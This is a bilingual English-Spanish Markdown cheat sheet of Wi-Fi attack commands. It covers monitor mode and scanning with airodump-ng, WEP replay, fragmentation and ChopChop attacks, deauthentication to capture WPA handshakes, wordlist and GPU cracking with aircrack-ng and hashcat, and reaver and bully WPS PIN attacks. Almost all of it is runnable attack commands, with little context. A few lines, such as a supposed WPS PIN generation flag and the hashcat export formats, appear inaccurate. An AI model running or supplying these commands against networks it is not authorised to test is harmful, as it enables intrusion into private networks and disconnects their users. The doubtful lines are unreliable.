# CheatSheet
[Fuente - 1](https://1337skills.com/cheatsheets/aircrack-ng/)
[Fuente - 2](https://cheatsheet.haax.fr/wireless/wifi_cracking/)
## Interface Management
>Managing wireless interfaces and monitor mode:

### arimon-ng

```bash
# Check wireless interfaces
sudo airmon-ng

# Check interface details
iwconfig
sudo iw dev

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlanX

# Enable monitor mode specific channel
sudo airmon-ng start wlanX 11

# Check monitor mode interface (usually wlan0mon)
iwconfig

# Change channel
sudo iwconfig wlanXmon channel 6
sudo iw dev wlanXmon set channel 6

# Set specific frequency
sudo iw dev wlanXmon set freq 2437

# Disable monitor mode
sudo airmon-ng stop wlanXmon

# Restart network services
sudo systemctl restart NetworkManager
sudo systemctl restart wpa_supplicant
```

## Network Discovery
>Discovering wireless networks and clients:

### airodump-ng

```bash
# Basic/General network scan
sudo airodump-ng wlanXmon

# Scan specific channel
sudo airodump-ng -c 6 wlan0mon

# Evita que al intentar realizar un ataque la interfaz monitor salte de canal 
sudo airodump-ng --channel 6 wlan0mon

# Scan specific BSSID
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Write capture to file
sudo airodump-ng -w capture wlan0mon

# Show only WEP networks
sudo airodump-ng --encrypt WEP wlan0mon

# Show only WPA networks
sudo airodump-ng --encrypt WPA wlan0mon

# Scan with manufacturer lookup
sudo airodump-ng -M wlan0mon

# Scan specific frequency range
sudo airodump-ng --band a wlan0mon  # 5GHz
sudo airodump-ng --band bg wlan0mon # 2.4GHz

# Advanced scanning options
sudo airodump-ng -c 1-13 --band bg -w scan_results wlan0mon

# Monitor specific network and clients
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w target wlan0mon
```

## WEP Attacks
>WEP encryption attacks and key recovery:

```bash
# Capture WEP traffic
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# ARP replay attack (in new terminal)
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:AA:BB wlan0mon

# Fake authentication (if needed)
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:AA:BB wlan0mon

# Fragmentation attack
sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:AA:BB wlan0mon

# ChopChop attack
sudo aireplay-ng -4 -b AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:AA:BB wlan0mon

# Interactive packet replay
sudo aireplay-ng -2 -b AA:BB:CC:DD:EE:FF -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon

# Crack WEP key (run when sufficient IVs collected)
aircrack-ng wep_capture-01.cap

# Crack with specific key length
aircrack-ng -n 64 wep_capture-01.cap   # 64-bit WEP
aircrack-ng -n 128 wep_capture-01.cap  # 128-bit WEP

# Use custom wordlist
aircrack-ng -w wordlist.txt wep_capture-01.cap
```

## WPA/WPA2 Attacks
>WPA/WPA2 handshake capture and cracking:

```bash
# Capture WPA handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon

# Deauthentication attack to force handshake (in new terminal)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Target specific client
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:AA:BB wlan0mon

# Verify handshake capture
aircrack-ng wpa_capture-01.cap

# Crack with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_capture-01.cap

# Crack specific BSSID
aircrack-ng -b AA:BB:CC:DD:EE:FF -w wordlist.txt wpa_capture-01.cap

# Use custom wordlist with rules
aircrack-ng -w custom_wordlist.txt wpa_capture-01.cap

# Crack with ESSID
aircrack-ng -e "NetworkName" -w wordlist.txt wpa_capture-01.cap

# Show handshake without cracking
aircrack-ng -J hashcat_format wpa_capture-01.cap

# Convert to hashcat format
aircrack-ng -J hashcat_hashes wpa_capture-01.cap
hashcat -m 2500 hashcat_hashes.hccapx wordlist.txt
```

## WPS Attacks
>WPS (WiFi Protected Setup) attacks:

```bash
# Scan for WPS-enabled networks
sudo airodump-ng --wps wlan0mon

# Check WPS lock status
sudo wash -i wlan0mon

# Reaver WPS PIN attack
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Reaver with specific options
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -L -N -d 15 -T .5 -c 6 -r 3:15

# Bully WPS attack
sudo bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon

# Pixie dust attack
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K

# WPS PIN generation
sudo aircrack-ng -W pin_list.txt
```

## Advanced Cracking Techniques
>Advanced password cracking and optimization:

```bash
# Multi-threaded cracking
aircrack-ng -w wordlist.txt -p 4 capture.cap

# Cracking with custom character set
crunch 8 8 abcdefghijklmnopqrstuvwxyz|aircrack-ng -w - capture.cap

# Using John the Ripper with Aircrack-ng
aircrack-ng -J john_format capture.cap
john --wordlist=wordlist.txt john_format.hccap

# Hashcat integration
aircrack-ng -J hashcat_format capture.cap
hashcat -m 2500 -a 0 hashcat_format.hccapx wordlist.txt

# GPU-accelerated cracking with hashcat
hashcat -m 2500 -a 3 -w 3 hashcat_format.hccapx ?d?d?d?d?d?d?d?d

# Mask attack with hashcat
hashcat -m 2500 -a 3 hashcat_format.hccapx ?u?l?l?l?l?l?d?d

# Rule-based attack
hashcat -m 2500 -a 0 -r rules/best64.rule hashcat_format.hccapx wordlist.txt

# Combination attack
hashcat -m 2500 -a 1 hashcat_format.hccapx wordlist1.txt wordlist2.txt

# Distributed cracking setup
# On master node:
hashcat -m 2500 -a 0 --session=distributed hashcat_format.hccapx wordlist.txt

# On worker nodes:
hashcat -m 2500 -a 0 --session=worker1 --restore-file-path=distributed.restore hashcat_format.hccapx wordlist.txt
```

### aireplay-ng
```bash
# Prueba de Inyección Básica
sudo aireplay-ng -9 wlan0mon
```
```bash
# prueba de inyección contra un ESSID específico con la opción -e y el ESSID, y la opción -a y el BSSID
sudo aireplay-ng -9 -e wifu -a 34:08:04:09:3D:38 wlan0mon
```
```bash
# Prueba de inyección de tarjeta a tarjeta (ataque)
sudo aireplay-ng -9 -i wlan1mon wlan0mon
```

### aircrack-ng
```bash
aircrack-ng -S
```
### airdecap-ng
```bash
sudo airdecap-ng -b 34:08:04:09:3D:38 opennet-01.cap
```
### airgraph-ng
```bash
airgraph-ng -o Picture2.png -i dump-01.csv -g CPG
```
```bash
airgraph-ng -o Picture1_png -i dump-01.csv -g CAPR
```
